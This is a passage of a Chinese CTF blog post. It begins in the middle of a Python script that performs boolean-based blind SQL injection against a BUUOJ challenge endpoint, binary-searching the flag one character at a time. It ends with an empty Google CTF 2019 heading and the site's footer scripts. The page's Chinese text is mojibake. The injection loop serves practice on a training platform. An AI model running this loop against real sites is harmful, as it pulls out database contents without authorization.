</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://f695d102-a73b-4b8a-a546-b63ea583f09f.node5.buuoj.cn:81/backend/content_detail.php?id=&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="n">payload4</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">url</span><span class="o">+=</span><span class="n">payload</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">text</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;æœ­å¸ˆå‚…ç¼ºä¸ªå¥³æœ‹å‹&#34;</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span><span class="o">==</span><span class="s1">&#39;&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="googlectf2019-qualsbnv">[GoogleCTF2019 Quals]Bnv
</h2>
</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/%E5%88%B7%E9%A2%98/">åˆ·é¢˜</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under 9u_l3</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">ç›¸å…³æ–‡ç« </h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/xctf%E5%88%B7%E9%A2%98/">
        
        
            <div class="article-image">
                <img src="/p/xctf%E5%88%B7%E9%A2%98/1.b6981e26e3ff7be7ee3895b83dbe93a1.jpg" 
                        width="5416" 
                        height="2894" 
                        loading="lazy"
                        alt="Featured image of post xctfåˆ·é¢˜"
                        
                        data-hash="md5-tpgeJuP/e&#43;fuOJW4Pb6ToQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">xctfåˆ·é¢˜</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/">
        
        
            <div class="article-image">
                <img src="/p/%E7%8E%84%E6%9C%BA%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0/1.36b7be2aa84abef312bd7b8ca3fd18f0.png" 
                        width="1216" 
                        height="832" 
                        loading="lazy"
                        alt="Featured image of post ç„æœºæ‰“é¶æ—¥è®°"
                        
                        data-hash="md5-Nre&#43;KqhKvvMSvXuMo/0Y8A==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">ç„æœºæ‰“é¶æ—¥è®°</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/thm%E6%97%A5%E8%AE%B0/">
        
        
            <div class="article-image">
                <img src="/p/thm%E6%97%A5%E8%AE%B0/1.c45bccdc896ea1f57e891c02d54ef513.png" 
                        width="2048" 
                        height="1536" 
                        loading="lazy"
                        alt="Featured image of post thmæ—¥è®°"
                        
                        data-hash="md5-xFvM3IluofV&#43;iRwC1U71Ew==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">thmæ—¥è®°</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
<div id="waline" class="waline-container"></div>
<style>
    .waline-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
        --waline-font-size: var(--article-font-size);
    }
    .waline-container .wl-count {
        color: var(--card-text-color-main);
    }
</style><script>
    
    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://unpkg.com/@waline/emojis@1.0.1/weibo"],"locale":{"admin":"Admin","placeholder":null},"requiredMeta":["name","email","url"],"serverURL":"https://waline-test-one-smoky.vercel.app"});
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2025 æ— æ•Œå¯çˆ±ç¾å’•å™œ
    </section>
    
    <section class="powerby">
        ä½¿ç”¨ <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> æ„å»º <br />
        ä¸»é¢˜ <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> ç”± <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> è®¾è®¡
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

<style>
  body {
    background: url(https://0d000721999.github.io/background/1.png) no-repeat center top;
    background-size: cover;
    background-attachment: fixed;
  }
</style>

 
<style>
  @font-face {
    font-family: 'ss';
    src: url(https://0d000721999.github.io/font/SeriousShannsNerdFontMono-Regular.otf) format('opentype');
  }

  :root {
    --base-font-family: 'ss';
    --code-font-family: 'ss';
  }
</style>
<style>
    #TableOfContents > ul, ol {
        ul, ol {
            display: none;
        }
        .open {
            display: block;
        }
    }
</style>

<script>
    function initTocHide() {
        
        let toc = document.querySelector(".widget--toc");
        if (!toc) {
            return;
        }
        
        window.addEventListener('scroll', function() {
            
            let openUl = document.querySelectorAll(".open");
            if (openUl.length > 0) {
              openUl.forEach((ul) => {
                ul.classList.remove("open")
              })
            }
            
            let currentLi = document.querySelector(".active-class");
            if (!currentLi) {
                return
            }
            
            if (currentLi.children.length > 1) {
                currentLi.children[1].classList.add("open")
            }
            
            let ul = currentLi.parentElement;
            do {
                ul.classList.add("open");
                ul = ul.parentElement.parentElement
            } while (ul !== undefined && (ul.localName === 'ul' || ul.localName === 'ol'))
        });
    }
    initTocHide()
</script>

<style>
    #backTopBtn {
        display: none;
        position: fixed;
        bottom: 30px;
        z-index: 99;
        cursor: pointer;
        width: 30px;
        height: 30px;
        background-image: url(https://0d000721999.github.io/icons/backTop.svg);
    }
</style>

<script>
    

    function initScrollTop() {
        let rightSideBar = document.querySelector(".right-sidebar");
        if (!rightSideBar) {
            return;
        }
        
        let btn = document.createElement("div");
        btn.id = "backTopBtn";
        btn.onclick = backToTop
        rightSideBar.appendChild(btn)
        
        window.onscroll = function() {
            
            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
                btn.style.display = "block";
            } else {
                btn.style.display = "none";
            }
        };
    }

    

    function backToTop(){
        window.scrollTo({ top: 0, behavior: "smooth" })
    }

    initScrollTop();
</script>


<script>   
  const cdnPath = "https://cdn.jsdelivr.net/gh/0d000721999/live2d-test@f09405fd";
  const cssPath = "https://0d000721999.github.io/waifu/waifu.css"
  const config = {
    
    path: {
      homePath: "/",
      modelPath: cdnPath + "/Resources/",
      cssPath: cssPath,
      tipsJsonPath: cdnPath + "/waifu-tips.json",
      tipsJsPath: cdnPath + "/waifu-tips.js",
      live2dCorePath: cdnPath + "/Core/live2dcubismcore.js",
      live2dSdkPath: cdnPath + "/live2d-sdk.js"
    },
    
    tools: ["hitokoto", "asteroids", "express","photo", "quit"],
    
    drag: {
      enable: true,
      direction: ["x", "y"]
    },
    
    switchType: "order"
  }

  
  if (screen.width >= 768) {
    Promise.all([
      loadExternalResource(config.path.cssPath, "css"),
      loadExternalResource(config.path.live2dCorePath, "js"),
      loadExternalResource(config.path.live2dSdkPath, "js"),
      loadExternalResource(config.path.tipsJsPath, "js")
    ]).then(() => {
      initWidget({
        waifuPath: config.path.tipsJsonPath,
        cdnPath: config.path.modelPath,
        tools: config.tools,
        dragEnable: config.drag.enable,
        dragDirection: config.drag.direction,
        switchType: config.switchType
      });
    });
  }

  
  function loadExternalResource(url, type) {
    return new Promise((resolve, reject) => {
      let tag;
      if (type === "css") {
        tag = document.createElement("link");
        tag.rel = "stylesheet";
        tag.href = url;
      }
      else if (type === "js") {
        tag = document.createElement("script");
        tag.src = url;
      }
      if (tag) {
        tag.onload = () => resolve(url);
        tag.onerror = () => reject(url);
        document.head.appendChild(tag);
      }
    });
  }
</script>

    </body>
</html>
